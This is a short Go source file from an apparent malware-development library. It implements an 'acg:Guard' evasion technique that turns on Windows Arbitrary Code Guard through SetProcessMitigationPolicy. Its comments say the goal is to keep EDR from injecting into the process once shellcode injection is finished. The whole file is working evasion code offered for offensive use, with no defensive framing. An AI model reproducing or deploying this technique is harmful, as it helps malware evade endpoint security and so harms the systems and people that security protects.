//go:build windows

package acg

import (
	"github.com/oioio-space/maldev/evasion"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

type guardTechnique struct{}

func (guardTechnique) Name() string { return "acg:Guard" }
func (guardTechnique) Apply(c evasion.Caller) error {
	var wc *wsyscall.Caller
	if c != nil {
		if typed, ok := c.(*wsyscall.Caller); ok {
			wc = typed
		}
	}
	return Enable(wc)
}

// Guard returns a Technique that enables Arbitrary Code Guard (ACG).
//
// How it works: calls SetProcessMitigationPolicy to set ProhibitDynamicCode=1.
// Once enabled, VirtualAlloc(PAGE_EXECUTE_*) and similar calls are blocked.
// This prevents EDR from injecting executable code into the process.
//
// WARNING: This is IRREVERSIBLE. Apply AFTER all shellcode injection is complete.
// Any subsequent attempt to allocate executable memory will fail.
func Guard() evasion.Technique { return guardTechnique{} }
